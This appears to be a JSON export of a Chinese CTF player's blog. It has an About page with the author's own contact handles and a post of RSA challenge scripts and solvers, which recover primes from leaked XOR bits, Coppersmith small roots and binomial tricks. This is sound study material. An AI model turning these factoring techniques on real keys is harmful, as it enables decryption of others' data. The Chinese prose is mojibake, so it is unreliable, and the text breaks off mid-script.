[{"content":"\rabout # æˆ‘äº‹è°ï¼Ÿ # idï¼šljahum\r@Syclover\nç›®å‰åœ¨èœ€å—ä¿¡ä¸“å½“é¼ é¼ ğŸ€\nqqï¼š1695325350\nG-mailï¼šroomoflja@gmail.com\ngithub|\rç•™è¨€æ¿\ndiscord : ljahum#7113\nsteam: 149018740\nSometimes I have fun here\nç½‘å®‰èœé¸¡ï¼Œå¸Œæœ›åœ¨é¥è¿œçš„å°†æ¥ä¸ä¼šè¢«é¥¿æ­»\næƒ³æå¥½ç©çš„ä¸œè¥¿ï¼Œæƒ³æ°åˆ°é¥­ï¼Œæƒ³å®ç°æ¢¦æƒ³ æ— å¥ˆèƒ½åŠ›ä¸å¤Ÿæ™ºå•†ä½ä¸‹ä¹ æƒ¯é‚‹é¢\nåªèƒ½å½“ä¸ªå’¸é±¼æ··åƒç­‰æ­»\næ†¨æ‰¹luå’Œä»–çš„æœ‹å‹ä»¬ # éšç¼˜æ’åº\næ•å¨œæ¡‘ # æµªè¶…äºº é˜¿ç¥–ç¥– wlz ç¾½é¸½é¸½ leohreats èŠ‹å¤´ cr0ssÃ—2 muhe é‡‘å¤ªå› jly zoniony const27 ç¿°æ€» æ³ªç¬‘ é›·æ€» ç‹è¿‡å¹´ å§¥çˆ· é©¬çˆ·çˆ· æ™‹çˆ·çˆ· ç‡•ä¹˜é£ é”…è€å¸ˆ æ½˜ğŸ‘´ åšå“¥ è‚–å¸ˆå‚… å­¦å¼Ÿ/å¦¹ # ç†ŠçŒ«æ“ä½œç³»ç»Ÿ åŠäººzwh å­™è€æ¿ é—»é“ƒ å¾¡å²ç¥é£ Myu å¤§è›‡ å¤–æ ¡ğŸ‘´ # N0vice x1c team # â¤è‚¥çŒ«å˜¤å˜¤ To1in å¦‚æœä½ å–œæ¬¢å˜‰ç„¶,å“ªæˆ‘ä»¬å°±æ˜¯å¼‚çˆ¶å¼‚æ¯çš„å¥½å…„å¼Ÿ\n","date":"20 February 2021","permalink":"/achieve/about/","section":"archive","summary":"","title":"About"},{"content":"\rè¿ç§» # https://slash-clavicle-dbb.notion.site/Shared-073326638a86449c9a06d6467fed470f\n","date":"11 February 2023","permalink":"/achieve/to_noiton/","section":"archive","summary":"","title":"è¿ç§»"},{"content":"\rdisplay cabinet. # ","date":"4 November 2023","permalink":"/","section":"","summary":"display cabinet.","title":""},{"content":"","date":"4 November 2023","permalink":"/categories/","section":"Categories","summary":"","title":"Categories"},{"content":"","date":"4 November 2023","permalink":"/tags/crypto/","section":"Tags","summary":"","title":"crypto"},{"content":"","date":"4 November 2023","permalink":"/tags/math/","section":"Tags","summary":"","title":"math"},{"content":"","date":"4 November 2023","permalink":"/categories/posts/","section":"Categories","summary":"","title":"posts"},{"content":"This section contains all my current projects.\n","date":"4 November 2023","permalink":"/articles/","section":"Projects","summary":"This section contains all my current projects.","title":"Projects"},{"content":"\rrsa all in two # leak (p^q)\u0026raquo;nbits # from Crypto.Util.number import * import sys sys.setrecursionlimit(1500) nbits=512 leakBits = 262 leakbits = nbits - leakBits e = 65537 n=73822410148110759760164946405270228269255384237831275745269402590230495569279769799226813942899942423718229747478982630879557319063920515141217164980012063064986634632452289290326704640527699568662492105204165609614169349755365956569362139057327962393611139347462018186440108621311077722819578905265976612923 c=71808322808599218331233291542779486534747913572475630198802984648982830332628443972652322590637382696027943799004331488098592525306523343649935216419522329722152742610560398216737030893090641493326477786720839849938277402743820773957184083430369443325368720115515840174745825798187125454448297155036065857691 leak=2223117424030234543005449667053988296724455736030907136592525175314696509716321 leak = leak \u0026lt;\u0026lt; leakbits a1 = \u0026#34;0\u0026#34; + str(bin(leak)[2:]) def find(p,q): l = len(p) tmp0 = p + (512-l)*\u0026#34;0\u0026#34; tmp1 = p + (512-l)*\u0026#34;1\u0026#34; tmq0 = q + (512-l)*\u0026#34;0\u0026#34; tmq1 = q + (512-l)*\u0026#34;1\u0026#34; if(int(tmp0,2) \u0026lt; int(tmq0,2)): return if(int(tmp0,2)*int(tmq0,2) \u0026gt; n): return elif(int(tmp1,2)*int(tmq1,2) \u0026lt; n): return if(l == 512 - leakbits): pp = int(tmp0,2) PR.\u0026lt;x\u0026gt; = PolynomialRing(Zmod(n)) f = pp + x*2 + 1 f = f.monic() res = f.small_roots(X=2^leakbits-1, beta=0.5, epsilon=0.01) if(res): try: plow = int(res[0]) p = pp + plow * 2 + 1 q = n // p d = inverse(e,(p-1)*(q-1)) print(long_to_bytes(int(pow(c,d,n)))) except: pass else: if(a1[l] == \u0026#34;1\u0026#34;): find(p+\u0026#34;1\u0026#34;,q+\u0026#34;0\u0026#34;) find(p+\u0026#34;0\u0026#34;,q+\u0026#34;1\u0026#34;) else: find(p+\u0026#34;0\u0026#34;,q+\u0026#34;0\u0026#34;) find(p+\u0026#34;1\u0026#34;,q+\u0026#34;1\u0026#34;) tempp = \u0026#34;\u0026#34; tempq = \u0026#34;\u0026#34; find(tempp,tempq) #flag{6eb67115-38b1-4e75-b3fc-de3a9697e565} æ¯”è¾ƒ aii in one çš„ä¸€é›† # import sympy from Crypto.Util.number import * from secret import flag e = 65537 p1 = sympy.randprime(2 ** 1023,2 ** 1024) q1 = sympy.randprime(2 ** 1023,2 ** 1024) a1 = p1 ^ q1 b1 = p1 * q1 c1 = pow(bytes_to_long(flag[:19]),e,p1*q1) p2 = sympy.randprime(2 ** 511, 2 ** 512) q2 = sympy.randprime(2 ** 511, 2 ** 512) a2 = (p2 * q2) ^ (p2 + q2) b2 = (p2 * q2) ^ (p2 - q2) c2 = pow(bytes_to_long(flag[19:]),e,p2*q2) f= open(\u0026#39;output.txt\u0026#39;,\u0026#39;w\u0026#39;) f.write(str(a1)+\u0026#39;\\n\u0026#39;) f.write(str(b1)+\u0026#39;\\n\u0026#39;) f.write(str(c1)+\u0026#39;\\n\u0026#39;) f.write(str(a2)+\u0026#39;\\n\u0026#39;) f.write(str(b2)+\u0026#39;\\n\u0026#39;) f.write(str(c2)+\u0026#39;\\n\u0026#39;) a1=67739512154277162085770157687437441198363095490607019903179640765859289435128844487312739643781929328039885340492248268381181927215444058044731882600621443249379470235583032722854561171610662253187419453432598163528304052508578209017561499836803166110456130462444164049945234353225230736363194196935115979960 b1=17185396829856546439605443867156437815015135756541052637907770783830686534153389303291740769607944691156059669175157827203495395745826694347428694508457493991041224390283763876476601200114028282946724348906485066220181559142937065978299071246507281834301352443856315199896106182934770582627129779923357891915723961923663378398066801894395956482176730300442901078199030200112352639266103862753546370851947797706641058966862813099369195689336228579744994641830699890792017097474275824545664085264972274642572927392940910981115837831275773192989084712813373293435228956787629490757407431010258942490818726318175944867633 c1=2180773316568266715369209198734610509148388893757598741330158376506447322216176787253641696053169188685408469718202047474660716095850135317790263924418449270019680259700945680062960717565507426032265137192689118286560945331123730529355709043463330231284484658907466172538703301303440062783852136344472063837313195697915205569416630439851250171277336484771753816776835527532090668694986220968152676688392975798850738947165707984817923309381811015047150056144403783079156300625762879231698942313672034730244627530962258121618021680413439757194393609777357848156392150372631861473658135778661768208071991812674187273360 a2=102834527596695950719979111423985349726489864165244791755647652205679952999516919199218636781810880771255724153293007819995198831162629014290926266777774940370836206596205967641213842702547665263659933022253549718321445029287279257463914991950587622466780705329578580061019164231870445205566240956950369224751 b2=102834527596695950719979111423985349726489864165244791755647652205679952999516919199218636781810880771255724153293007819995198831162629014290926266777774949520538413350277489291427420271328741830415622921056457371226207219443304838109001023043838810016379140438034881290332449739051404396455209891630254998985 c2=46285230821397377383998198689981002335902850753318921384068480704506522918467396194184971163720421808774010121239873784436865080818119851642074388303787396280596526597467664310187113430990219486840906481260493087443528880139543560763852844535689852804877233056126591516506599561944164619603448246607830867682 p*qã€p^q 1 # import sympy from Crypto.Util.number import * from secret import flag e = 65537 p1 = sympy.randprime(2 ** 1023,2 ** 1024) q1 = sympy.randprime(2 ** 1023,2 ** 1024) a1 = p1 ^ q1 b1 = p1 * q1 # from Crypto.Util.number import * import sys sys.setrecursionlimit(1500) #part1,å‰ªæ a1=67739512154277162085770157687437441198363095490607019903179640765859289435128844487312739643781929328039885340492248268381181927215444058044731882600621443249379470235583032722854561171610662253187419453432598163528304052508578209017561499836803166110456130462444164049945234353225230736363194196935115979960 b1=17185396829856546439605443867156437815015135756541052637907770783830686534153389303291740769607944691156059669175157827203495395745826694347428694508457493991041224390283763876476601200114028282946724348906485066220181559142937065978299071246507281834301352443856315199896106182934770582627129779923357891915723961923663378398066801894395956482176730300442901078199030200112352639266103862753546370851947797706641058966862813099369195689336228579744994641830699890792017097474275824545664085264972274642572927392940910981115837831275773192989084712813373293435228956787629490757407431010258942490818726318175944867633 c1=2180773316568266715369209198734610509148388893757598741330158376506447322216176787253641696053169188685408469718202047474660716095850135317790263924418449270019680259700945680062960717565507426032265137192689118286560945331123730529355709043463330231284484658907466172538703301303440062783852136344472063837313195697915205569416630439851250171277336484771753816776835527532090668694986220968152676688392975798850738947165707984817923309381811015047150056144403783079156300625762879231698942313672034730244627530962258121618021680413439757194393609777357848156392150372631861473658135778661768208071991812674187273360 e = 65537 a1 = \u0026#34;0\u0026#34; + str(bin(a1)[2:]) def find(p,q): l = len(p) tmp0 = p + (1024-l)*\u0026#34;0\u0026#34; tmp1 = p + (1024-l)*\u0026#34;1\u0026#34; tmq0 = q + (1024-l)*\u0026#34;0\u0026#34; tmq1 = q + (1024-l)*\u0026#34;1\u0026#34; if(int(tmp0,2) \u0026lt; int(tmq0,2)): return if(int(tmp0,2)*int(tmq0,2) \u0026gt; b1): return elif(int(tmp1,2)*int(tmq1,2) \u0026lt; b1): return if(l == 1024): pp = int(tmp0,2) qq = int(tmq0,2) d = inverse(e,(pp-1)*(qq-1)) m = long_to_bytes(pow(c1,d,pp*qq)) print(str(m)[2:-1],end = \u0026#34;\u0026#34;) else: if(a1[l] == \u0026#34;1\u0026#34;): find(p+\u0026#34;1\u0026#34;,q+\u0026#34;0\u0026#34;) find(p+\u0026#34;0\u0026#34;,q+\u0026#34;1\u0026#34;) else: find(p+\u0026#34;0\u0026#34;,q+\u0026#34;0\u0026#34;) find(p+\u0026#34;1\u0026#34;,q+\u0026#34;1\u0026#34;) tempp = \u0026#34;\u0026#34; tempq = \u0026#34;\u0026#34; find(tempp,tempq) N ^ (p + q)ã€N ^ (p - q) # #part2 ç¡¬å‰ªæ a2=102834527596695950719979111423985349726489864165244791755647652205679952999516919199218636781810880771255724153293007819995198831162629014290926266777774940370836206596205967641213842702547665263659933022253549718321445029287279257463914991950587622466780705329578580061019164231870445205566240956950369224751 b2=102834527596695950719979111423985349726489864165244791755647652205679952999516919199218636781810880771255724153293007819995198831162629014290926266777774949520538413350277489291427420271328741830415622921056457371226207219443304838109001023043838810016379140438034881290332449739051404396455209891630254998985 c2=46285230821397377383998198689981002335902850753318921384068480704506522918467396194184971163720421808774010121239873784436865080818119851642074388303787396280596526597467664310187113430990219486840906481260493087443528880139543560763852844535689852804877233056126591516506599561944164619603448246607830867682 e = 65537 def find(p,q,k): mask = 2**k-1 t1 = (int(p,2)*int(q,2)) t2 = (int(p,2)+int(q,2)) t3 = (int(p,2)-int(q,2)) if(len(bin(int(p,2))[2:]) == 512 and len(bin(int(q,2))[2:]) == 512): pp = int(p,2) qq = int(q,2) d = inverse(e,(pp-1)*(qq-1)) m = long_to_bytes(pow(c2,d,pp*qq)) if(len(m) \u0026lt; 20): print(str(m)[2:-1]) exit() if(((t1^t2)\u0026amp;mask) == (a2\u0026amp;mask) and ((t1^t3)\u0026amp;mask) == (b2\u0026amp;mask)): find(\u0026#34;0\u0026#34;+p,\u0026#34;0\u0026#34;+q,k+1) find(\u0026#34;0\u0026#34;+p,\u0026#34;1\u0026#34;+q,k+1) find(\u0026#34;1\u0026#34;+p,\u0026#34;0\u0026#34;+q,k+1) find(\u0026#34;1\u0026#34;+p,\u0026#34;1\u0026#34;+q,k+1) else: return p = \u0026#34;1\u0026#34; q = \u0026#34;1\u0026#34; find(p,q,1) p*qã€p ^ inv_q # _q = int(bin(q)[2:][::-1] , 2)\rc = pow(m,e,n)\rprint(p ^ _q) from Crypto.Util.number import * import sys sys.setrecursionlimit(1500) pxorq = 47761879279815109356923025519387920397647575481870870315845640832106405230526 n = 10310021142875344535823132048350287610122830618624222175188882916320750885684668357543070611134424902255744858233485983896082731376191044874283981089774677 c = 999963120986258459742830847940927620860107164857685447047839375819380831715400110131705491405902374029088041611909274341590559275004502111124764419485191 e = 65537 pxorq = str(bin(pxorq)[2:]).zfill(256) def find(ph,qh,pl,ql): l = len(ph) tmp0 = ph + (256-2*l)*\u0026#34;0\u0026#34; + pl tmp1 = ph + (256-2*l)*\u0026#34;1\u0026#34; + pl tmq0 = qh + (256-2*l)*\u0026#34;0\u0026#34; + ql tmq1 = qh + (256-2*l)*\u0026#34;1\u0026#34; + ql if(int(tmp0,2)*int(tmq0,2) \u0026gt; n): return if(int(tmp1,2)*int(tmq1,2) \u0026lt; n): return if(int(pl,2)*int(ql,2) % (2**(l-1)) != n % (2**(l-1))): return if(l == 128): pp0 = int(tmp0,2) if(n % pp0 == 0): pf = pp0 qf = n//pp0 phi = (pf-1)*(qf-1) d = inverse(e,phi) m1 = pow(c,d,n) print(long_to_bytes(m1)) exit() else: if(pxorq[l] == \u0026#34;1\u0026#34; and pxorq[255-l] == \u0026#34;1\u0026#34;): find(ph+\u0026#34;1\u0026#34;,qh+\u0026#34;0\u0026#34;,\u0026#34;1\u0026#34;+pl,\u0026#34;0\u0026#34;+ql) find(ph+\u0026#34;0\u0026#34;,qh+\u0026#34;0\u0026#34;,\u0026#34;1\u0026#34;+pl,\u0026#34;1\u0026#34;+ql) find(ph+\u0026#34;1\u0026#34;,qh+\u0026#34;1\u0026#34;,\u0026#34;0\u0026#34;+pl,\u0026#34;0\u0026#34;+ql) find(ph+\u0026#34;0\u0026#34;,qh+\u0026#34;1\u0026#34;,\u0026#34;0\u0026#34;+pl,\u0026#34;1\u0026#34;+ql) elif(pxorq[l] == \u0026#34;1\u0026#34; and pxorq[255-l] == \u0026#34;0\u0026#34;): find(ph+\u0026#34;1\u0026#34;,qh+\u0026#34;0\u0026#34;,\u0026#34;0\u0026#34;+pl,\u0026#34;0\u0026#34;+ql) find(ph+\u0026#34;0\u0026#34;,qh+\u0026#34;0\u0026#34;,\u0026#34;0\u0026#34;+pl,\u0026#34;1\u0026#34;+ql) find(ph+\u0026#34;1\u0026#34;,qh+\u0026#34;1\u0026#34;,\u0026#34;1\u0026#34;+pl,\u0026#34;0\u0026#34;+ql) find(ph+\u0026#34;0\u0026#34;,qh+\u0026#34;1\u0026#34;,\u0026#34;1\u0026#34;+pl,\u0026#34;1\u0026#34;+ql) elif(pxorq[l] == \u0026#34;0\u0026#34; and pxorq[255-l] == \u0026#34;1\u0026#34;): find(ph+\u0026#34;0\u0026#34;,qh+\u0026#34;0\u0026#34;,\u0026#34;1\u0026#34;+pl,\u0026#34;0\u0026#34;+ql) find(ph+\u0026#34;0\u0026#34;,qh+\u0026#34;1\u0026#34;,\u0026#34;0\u0026#34;+pl,\u0026#34;0\u0026#34;+ql) find(ph+\u0026#34;1\u0026#34;,qh+\u0026#34;0\u0026#34;,\u0026#34;1\u0026#34;+pl,\u0026#34;1\u0026#34;+ql) find(ph+\u0026#34;1\u0026#34;,qh+\u0026#34;1\u0026#34;,\u0026#34;0\u0026#34;+pl,\u0026#34;1\u0026#34;+ql) elif(pxorq[l] == \u0026#34;0\u0026#34; and pxorq[255-l] == \u0026#34;0\u0026#34;): find(ph+\u0026#34;0\u0026#34;,qh+\u0026#34;0\u0026#34;,\u0026#34;0\u0026#34;+pl,\u0026#34;0\u0026#34;+ql) find(ph+\u0026#34;1\u0026#34;,qh+\u0026#34;0\u0026#34;,\u0026#34;0\u0026#34;+pl,\u0026#34;1\u0026#34;+ql) find(ph+\u0026#34;0\u0026#34;,qh+\u0026#34;1\u0026#34;,\u0026#34;1\u0026#34;+pl,\u0026#34;0\u0026#34;+ql) find(ph+\u0026#34;1\u0026#34;,qh+\u0026#34;1\u0026#34;,\u0026#34;1\u0026#34;+pl,\u0026#34;1\u0026#34;+ql) find(\u0026#34;1\u0026#34;,\u0026#34;1\u0026#34;,\u0026#34;1\u0026#34;,\u0026#34;1\u0026#34;) other # æš‘å‡åšçš„ä¸€ä¸ªå°é¢˜ # leak1 = (p2+q2) \u0026gt;\u0026gt; 400 leak2 = (p1 \u0026amp; ((1 \u0026lt;\u0026lt; 350) - 1)) \u0026gt;\u0026gt; 5 é¢˜ç›®çš„ä¸»è¦é—®é¢˜åœ¨äºç”±leak1è§£å‡ºleak2ã€‚æ˜¾ç„¶ï¼Œå¦‚æœæˆ‘ä»¬æœ‰å®Œæ•´çš„p2+q2ï¼Œæˆ‘ä»¬å°±èƒ½å¤Ÿç›´æ¥è”ç«‹n2çš„æ–¹ç¨‹å¾—åˆ°ç²¾ç¡®çš„p2ã€q2çš„å€¼ã€‚ä½†æ˜¯é—®é¢˜åœ¨äºleak1çš„ä½å››ç™¾ä½è¢«éšè—äº†ï¼Œå› æ­¤æˆ‘ä»¬æ²¡æœ‰åŠæ³•ç›´æ¥è§£å‡ºç²¾ç¡®çš„p2ã€q2ã€‚ è€Œäº‹å®ä¸Šï¼Œæˆ‘ä»¬å¹¶ä¸éœ€è¦ç²¾ç¡®çš„p2ã€q2ï¼Œæˆ‘ä»¬åªéœ€è¦çŸ¥é“ä»–ä»¬çš„é«˜ä½ï¼Œå°±å¯ä»¥é€šè¿‡pé«˜ä½æ³„æ¼æ±‚å‡ºä»–ä»¬çš„ç²¾ç¡®å€¼ã€‚å› æ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸‹é¢æ–¹å¼è§£å‡ºp2ã€q2çš„è¿‘ä¼¼å€¼ï¼š #part1 get leak2 PR.\u0026lt;x\u0026gt; = PolynomialRing(RealField(1000)) f = x*((leak1\u0026lt;\u0026lt;400)-x) - n2 p2high = int(f.roots()[0][0]) smallrootè§£æ–¹ç¨‹ # def getn(): while(1): p = getPrime(128) error = getPrime(40) q = 2*p + error r = 2*q + error if(isPrime(q) and isPrime(r)): n = p*q*r break return (p,n) æ‹¿pè§£æ–¹ç¨‹\n#step 1 PR.\u0026lt;x\u0026gt; = PolynomialRing(Zmod(n1//p1)) f = (2*p1 + x)*(4*p1 + 3*x) f = f.monic() roots = f.small_roots(X=2^41,beta=0.4) if roots: error = int(roots[0]) è¿åˆ†æ•° # num1 = 3 num2 = 5 while(num1\u0026lt;num2): num1 = getPrime(512) num2 = getPrime(512) num3 = ring(num1) / ring(num2) num3 = 1.23389923415003373900567515471436168841941584796842188964423737295914869304653496800649965063081353720701415762591488370228399019899893688681309320356016722276295236528757306976510687729729934668311830828756908988350841843676900575414367123810470585198055372776278588638204471298838884740198056387082949710435502826460830711429956 c = continued_fraction(num3) print(c) alist = c.convergents() for i in alist: a = str(i).split(\u0026#39;/\u0026#39;) if len(a)\u0026gt;1 and gcd(int(a[0]),int(a[1])) == 1 and is_prime(int(a[0])) and is_prime(int(a[1])) and int(a[0]).bit_length()==512 and int(a[1]).bit_length()==512: num1 = int(a[0]) num2 = int(a[1]) äºŒé¡¹å¼ # myfunction(n)çš„ç»“æœæ˜¯n^3ï¼Œé‚£è¿™ä¸ªæ–¹ç¨‹å°±å˜æˆäº†hint2 = (3n+1)^p_low mod n^3ï¼ŒäºŒé¡¹å¼å®šç†å±•å¼€ï¼Œçœ‹ç³»æ•°èƒ½ç®—å‡ºæ¥p_lowï¼Œç„¶åcoppersmithæ±‚å‡ºpå°±è¡Œäº†\nfrom Crypto.Util.number import * from Crypto.Util.strxor import strxor from random import randint from gmpy2 import invert import os flag = b\u0026#39;xxx\u0026#39; def mypad(m): l = len(m) r = 190 - l padded_m = m + os.urandom(r) return padded_m def myfunction(num): output = 0 j = 0 for i in range(num): output += (i+j)*6 + 1 j += i return output def mix(a,b): return a | b , a * b class MySeries(): def __init__(self, num): self.num = num def Coe(self, n): i = 0 c = 1 while i \u0026lt; n: i += 1 c = (c * (1 / 2 - i + 1)) / i return c def Point(self, center): sum = 0 center -= 1 i = 0 while i \u0026lt; self.num: sum += (center ** (1 / 2 - i) * self.Coe(i)) i += 1 return sum def All(bound): num = randint(1111, 2222) T = MySeries(num) output = 0 i = 3 while i \u0026lt; bound: b1 = T.Point(i) b2 = T.Point(i + 1) output += (b1 + b2) / 2 i += 1 return output if __name__ == \u0026#39;__main__\u0026#39;: flag_len = len(flag) p,q = getPrime(512),getPrime(512) while True: r = getPrime(512) R = bytes_to_long(str(r).encode()) if isPrime(R): break n = p * q * r hint1 = R * r mod = myfunction(n) hint2 = pow(3*n+1,p % (2 ** 400),mod) k = int(All(n)) xor_flag = strxor(long_to_bytes(k \u0026gt;\u0026gt; (k.bit_length() - 8 * flag_len)),flag) pad_flag = mypad(xor_flag) m = bytes_to_long(pad_flag) c = pow(m,65537,n) print(\u0026#39;All data:\u0026#39;) print(f\u0026#39;flag_len = {flag_len}\u0026#39;) print(f\u0026#39;n = {n}\u0026#39;) print(f\u0026#39;c = {c}\u0026#39;) print(f\u0026#39;hint1 = {hint1}\u0026#39;) print(f\u0026#39;hint2 = {hint2}\u0026#39;) \u0026#39;\u0026#39;\u0026#39; All data: flag_len = 42 n = 1885106209951408608833065466098355578239648885277085979696889428331716535742564778501798478665957825315340421821880653818505857049636611632357321104069926874970489073929053910350131880591544986024406953378391135673202854750625745159391997973535848495128365477217006260495413869532372418221652962946340513593002422433536479789576519469228846773250447077165756739529520975715667675188738514871033908115371290569902086064227476952606366538782284487477820835988316471 c = 696238728213276154324787695659767792043458798396732235983493075871691401810545168845655490352789752222363100922123671319198981013421632076090146254867823593523050502577701155837063376958530879006719716789887624440134559774538443909463537086796915613123528679984244371544503657821859556837415229166015914540860398289216765611441964228176020361651359395184571105468667815326494558761738459063914192172836518999575866452752941368767971539919141604299843463853501960 hint1 = 47533994701669017942592643580845693193316601935087923279407365999451221242084261195588230994183718077379066856479267476895986608547324057765879168010176037349172136581929046771540241367625486215731295814611283581608613208990206581757576978017732022062210538697720930605552259306749633658032304554578427461842934055558865521604512892691323385156889995854702621568441768712619224249280792783364635307739215957762771386413831279443875185633720270001928747743847856394847878232194076679733830705297410959656270945532930199517880949 hint2 = 1345739841248959791137389026125065605121513428784838684290299665636596562317989590469829195181078904857051392378877013458099983407103737518119999468489762053545474516182879516762580472262640794849609626308003164739287189671066241628052826558582865342176036139097546843281565147798609965645514151827840249686650855385385323417455247722134760335695053787221300451942370377598800841980049138341564555801417479362085565640973199260631136149016266661293883650801813550118778433333591258278147003619871962070136454674193198696690506092831171400435490432196636796719177624389194619648086397178720207413652618636521150924913978530986709499047969775311955879302418093270101476537853298615347062384026172441455857088955847766335746521291043747795520485020303040819568036819058385444936925860671650596681910380157657689041971132993731048618045570715513584627109356139903842365556697314631573799394266292587334468008221427502353566938518574247502783245674619641519095644135976062817840893465238031354234069073928763492529419021632732679912738674105898149050223970723297059883534089683179512881491210176114419520070007595698242827625902377045860953285447617249204919971737086366 \u0026#39;\u0026#39;\u0026#39; $$ hint2 = (3n+1)^{p\u0026rsquo;} mod n^3 $$\n$$ = kn^3+9(p\u0026rsquo;\\frac{(p\u0026rsquo;-1)}{2})n^2 + 3p\u0026rsquo;n + 1\n$$\nfrom Crypto.Util.number import * from Crypto.Util.strxor import strxor flag_len = 42 n = 1885106209951408608833065466098355578239648885277085979696889428331716535742564778501798478665957825315340421821880653818505857049636611632357321104069926874970489073929053910350131880591544986024406953378391135673202854750625745159391997973535848495128365477217006260495413869532372418221652962946340513593002422433536479789576519469228846773250447077165756739529520975715667675188738514871033908115371290569902086064227476952606366538782284487477820835988316471 c = 696238728213276154324787695659767792043458798396732235983493075871691401810545168845655490352789752222363100922123671319198981013421632076090146254867823593523050502577701155837063376958530879006719716789887624440134559774538443909463537086796915613123528679984244371544503657821859556837415229166015914540860398289216765611441964228176020361651359395184571105468667815326494558761738459063914192172836518999575866452752941368767971539919141604299843463853501960 hint1 = 47533994701669017942592643580845693193316601935087923279407365999451221242084261195588230994183718077379066856479267476895986608547324057765879168010176037349172136581929046771540241367625486215731295814611283581608613208990206581757576978017732022062210538697720930605552259306749633658032304554578427461842934055558865521604512892691323385156889995854702621568441768712619224249280792783364635307739215957762771386413831279443875185633720270001928747743847856394847878232194076679733830705297410959656270945532930199517880949 hint2 = 1345739841248959791137389026125065605121513428784838684290299665636596562317989590469829195181078904857051392378877013458099983407103737518119999468489762053545474516182879516762580472262640794849609626308003164739287189671066241628052826558582865342176036139097546843281565147798609965645514151827840249686650855385385323417455247722134760335695053787221300451942370377598800841980049138341564555801417479362085565640973199260631136149016266661293883650801813550118778433333591258278147003619871962070136454674193198696690506092831171400435490432196636796719177624389194619648086397178720207413652618636521150924913978530986709499047969775311955879302418093270101476537853298615347062384026172441455857088955847766335746521291043747795520485020303040819568036819058385444936925860671650596681910380157657689041971132993731048618045570715513584627109356139903842365556697314631573799394266292587334468008221427502353566938518574247502783245674619641519095644135976062817840893465238031354234069073928763492529419021632732679912738674105898149050223970723297059883534089683179512881491210176114419520070007595698242827625902377045860953285447617249204919971737086366 r = gcd(n, hint1) pq = n // r P.\u0026lt;x\u0026gt; = PolynomialRing(ZZ) f = 9*x*(x-1)*n^2 + 6*x*n + 2 - 2*hint2 p_low = f.roots()[0][0] P.\u0026lt;y\u0026gt; = PolynomialRing(Zmod(pq)) g = 2^400*y + p_low g = g.monic() res = g.small_roots(X=2^112, beta=0.4, epsilon=0.03) p = 2^400*int(res[0]) + p_low q = pq // p phi = (p-1) * (q-1) * (r-1) assert p*q*r == n d = inverse(65537, phi) m_pad = long_to_bytes(int(pow(c, d, n))) m_xor = m_pad[:42] # print(m_pad) integral = lambda x: int(floor(2/3*(x^(3/2) - 3^(3/2)))) k = integral(n) flag = strxor(long_to_bytes(k \u0026gt;\u0026gt; (k.bit_length() - 8 * flag_len)), m_xor) print(flag) æ•°è®ºé¢˜ # hint2 = pow(2, 2023, Mod) # https://tangcuxiaojikuai.xyz/post/39588.html\nm = (m \u0026gt;\u0026gt; kbits) \u0026lt;\u0026lt; kbits Mod = getPrime(1024) hint1 = (2021-2023*m) % Mod hint2 = pow(2, 2023, Mod) print(\u0026#39;hint1 =\u0026#39;,hint1) print(\u0026#39;hint2 =\u0026#39;,hint2) $$ hint2-KM=2^{2023} \\ mod (M) $$\nhint1 = ... hint2 = ... e = 3 kM = 2**2023-hint2 PR.\u0026lt;x\u0026gt; = PolynomialRing(Zmod(kM)) f = 2023*x + hint1 - 2021 f = f.monic() roots = f.small_roots(X=2^200,beta=0.4) if roots: mhigh = roots[0] p1 = inverse(p,q) # m 1 = bytes_to_long(flag1) p = getPrime(512) q = getPrime(512) n = p*q phi = (p-1)*(q-1) d = gmpy2.invert(e,phi) p1 = gmpy2.invert(p,q) q1 = gmpy2.invert(q,p) c = pow(m1,e,n) print(\u0026#34;p1=\u0026#34;,p1) print(\u0026#34;q1=\u0026#34;,q1) print(\u0026#34;c=\u0026#34;,c) print(\u0026#34;phi=\u0026#34;,phi) å¸¦ç‚¹çˆ†ç ´\nfrom Crypto.Util.number import * #1 def gcd(a, b): while(b): a,b = b, a % b return a def mysqrt(d): st = 1 en = 10**1300 while st\u0026lt;=en: mid = (st+en)//2 if mid*mid == d: return mid if mid*mid \u0026lt; d: st=mid+1 else: en=mid-1 return -1 def egcd(a1, a2): x1, x2 = 1, 0 y1, y2 = 0, 1 while a2: q = a1 // a2 a1, a2 = a2, a1 - q * a2 x1, x2 = x2, x1 - q * x2 y1, y2 = y2, y1 - q * y2 return (x1, y1, a1) flag = \u0026#34;\u0026#34; ipmq= ... iqmp= ... phi= ... e = 65537 enc = ... d = inverse(e,phi) gg = gcd(iqmp-1,ipmq-1) c = phi // gg a = (ipmq-1)//gg b = (iqmp-1)//gg # p*a + q*b = c pmod = inverse(a, b)*c%b for j in range(100000): p = pmod + j*b if p \u0026gt; (1\u0026lt;\u0026lt;1024): break if not isPrime(p): continue q = (c-p*a)//b assert(p*a+q*b==c) if (iqmp*q-1)%p == 0 and (ipmq*p-1)%q == 0: M = pow(enc,d,p*q) flag += str(long_to_bytes(M))[2:-1] break hint = pow(2023*p + 114514, q, n) # äºŒé¡¹å¼\nhint = pow(2023 * p + 114514, q, n)\n$$ hint =2023p+k\\ mod \\ q\\hint =114514^p\\ =114514^{pq}\\ mod \\ q\\ $$\n$$ hint=114514^n\\ +kp+tn \\mod \\ p\\hint-14514^n=kp+0\\ mod\\ n $$\ncnss æ©ç å‰ªææ”¶é›† # 1\nprint(f\u0026#39;mask = {mask}\u0026#39;) print(p|mask) print(p\u0026amp;mask) from Crypto.Util.number import * c = 64949799997326584007544788513993497249594769744995858720976935000014197232306799968807213667255871030075230919683627404813038995304033226711042639925325815395252041199650244620814678407788637241064396318107929964286966081900052163098825412222835465966640369222321472659135622216530966800717417560715221275591 n = 106750680418525866311589462967145265327203310954735134383588573660691518247034803380198999333962213971657327515092895034635965957228036264848532931376595751503164297061094511187060069380048933807326213369464059701069965785612620370291933800122445966488267918733547599024267999872488061941892122230382138042783 mask = 12270330408774238331968219216635392599519489634111741706590917012819298856158311310855782884352875794146685141255943386189197362902992928716839082520848927 gift1 = 13112112110892990771168306272793201342028151601627796725313855804865001339738164412798270175076178951452110894792943424133718769511979832250960465757056799 gift2 = 11731832079629748669705816329667815638461774924918417348984676937048335348013101619038697983623814812736529127108466295988845879378764866277739393693264401 e = 65537 strmask = bin(mask)[2:] strgift1 = bin(gift1)[2:] strgift2 = bin(gift2)[2:] strp = [] for i in range(len(strmask)): if(strgift2[i] == \u0026#34;1\u0026#34;): strp.append(\u0026#34;1\u0026#34;) else: if(strgift1[i] == \u0026#34;1\u0026#34; and strmask[i] == 